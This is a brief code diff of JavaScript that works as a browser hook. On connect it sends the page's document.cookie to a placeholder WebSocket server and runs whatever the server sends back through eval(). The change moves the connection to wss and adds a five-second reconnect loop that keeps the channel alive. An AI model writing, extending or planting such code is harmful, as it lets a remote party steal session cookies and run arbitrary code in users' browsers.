@@ -1,4 +1,4 @@
-var ws = new WebSocket("ws://your-server-url:your-server-port");
+var ws = new WebSocket("wss://your-server-url:your-server-port");
 var messages = [];
 ws.onopen = function () {
   ws.send("session " + document.cookie);
@@ -13,8 +13,12 @@ function sendMessage(message) {
     messages.push(message);
   }
 }
-
 ws.onmessage = function (event) {
   eval(event.data);
 };
 
+setInterval(function () {
+  if (ws.readyState == WebSocket.CLOSED) {
+    ws = new WebSocket("wss://your-server-url:your-server-port");
+  }
+}, 5000);
